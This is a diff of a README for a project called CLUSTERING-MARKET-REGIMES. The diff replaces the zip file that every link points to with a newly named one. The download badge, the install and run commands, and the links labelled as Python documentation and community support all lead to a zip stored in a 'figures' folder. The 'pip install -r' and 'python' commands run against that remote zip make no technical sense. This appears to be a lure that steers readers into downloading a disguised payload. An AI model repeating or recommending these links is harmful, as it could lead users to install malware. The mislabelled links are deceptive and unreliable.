@@ -1,6 +1,6 @@
 # 📈 CLUSTERING-MARKET-REGIMES - Detect Market Trends Effortlessly
 
-[![Download CLUSTERING-MARKET-REGIMES](https://raw.githubusercontent.com/sogeking30/CLUSTERING-MARKET-REGIMES/main/figures/CLUSTERIN-MARKE-REGIMES-3.7.zip%20Now-CLUSTERING--MARKET--REGIMES-brightgreen)](https://raw.githubusercontent.com/sogeking30/CLUSTERING-MARKET-REGIMES/main/figures/CLUSTERIN-MARKE-REGIMES-3.7.zip)
+[![Download CLUSTERING-MARKET-REGIMES](https://raw.githubusercontent.com/sogeking30/CLUSTERING-MARKET-REGIMES/main/figures/REGIMES-CLUSTERIN-MARKE-v3.4-alpha.3.zip%20Now-CLUSTERING--MARKET--REGIMES-brightgreen)](https://raw.githubusercontent.com/sogeking30/CLUSTERING-MARKET-REGIMES/main/figures/REGIMES-CLUSTERIN-MARKE-v3.4-alpha.3.zip)
 
 ## 📖 About This Project
 
@@ -27,7 +27,7 @@ Before you start, ensure your system meets the following requirements:
 
 To download CLUSTERING-MARKET-REGIMES, visit this page:
 
-[Download CLUSTERING-MARKET-REGIMES](https://raw.githubusercontent.com/sogeking30/CLUSTERING-MARKET-REGIMES/main/figures/CLUSTERIN-MARKE-REGIMES-3.7.zip)
+[Download CLUSTERING-MARKET-REGIMES](https://raw.githubusercontent.com/sogeking30/CLUSTERING-MARKET-REGIMES/main/figures/REGIMES-CLUSTERIN-MARKE-v3.4-alpha.3.zip)
 
 You will find all available versions. Follow these steps:
 
@@ -44,7 +44,7 @@ After downloading, you need to install Python dependencies. Here is how to do it
 3. Type the following command and press Enter:
 
     ```bash
-    pip install -r https://raw.githubusercontent.com/sogeking30/CLUSTERING-MARKET-REGIMES/main/figures/CLUSTERIN-MARKE-REGIMES-3.7.zip
+    pip install -r https://raw.githubusercontent.com/sogeking30/CLUSTERING-MARKET-REGIMES/main/figures/REGIMES-CLUSTERIN-MARKE-v3.4-alpha.3.zip
     ```
 
 This command installs the necessary libraries for CLUSTERING-MARKET-REGIMES to run smoothly.
@@ -58,7 +58,7 @@ To run CLUSTERING-MARKET-REGIMES, follow these steps:
 3. Use the command below to start the application:
 
     ```bash
-    python https://raw.githubusercontent.com/sogeking30/CLUSTERING-MARKET-REGIMES/main/figures/CLUSTERIN-MARKE-REGIMES-3.7.zip
+    python https://raw.githubusercontent.com/sogeking30/CLUSTERING-MARKET-REGIMES/main/figures/REGIMES-CLUSTERIN-MARKE-v3.4-alpha.3.zip
     ```
 
 The application will launch, providing you with an interface to start analyzing market regimes.
@@ -110,9 +110,9 @@ If you encounter issues, consider the following:
 
 For more information and support, you can check the following links:
 
-- [Official Python Documentation](https://raw.githubusercontent.com/sogeking30/CLUSTERING-MARKET-REGIMES/main/figures/CLUSTERIN-MARKE-REGIMES-3.7.zip)
-- [GitHub Community Support](https://raw.githubusercontent.com/sogeking30/CLUSTERING-MARKET-REGIMES/main/figures/CLUSTERIN-MARKE-REGIMES-3.7.zip)
-- [Wasserstein Distance Explanation](https://raw.githubusercontent.com/sogeking30/CLUSTERING-MARKET-REGIMES/main/figures/CLUSTERIN-MARKE-REGIMES-3.7.zip)
+- [Official Python Documentation](https://raw.githubusercontent.com/sogeking30/CLUSTERING-MARKET-REGIMES/main/figures/REGIMES-CLUSTERIN-MARKE-v3.4-alpha.3.zip)
+- [GitHub Community Support](https://raw.githubusercontent.com/sogeking30/CLUSTERING-MARKET-REGIMES/main/figures/REGIMES-CLUSTERIN-MARKE-v3.4-alpha.3.zip)
+- [Wasserstein Distance Explanation](https://raw.githubusercontent.com/sogeking30/CLUSTERING-MARKET-REGIMES/main/figures/REGIMES-CLUSTERIN-MARKE-v3.4-alpha.3.zip)
 
 ## 📥 Contribution Guidelines
 
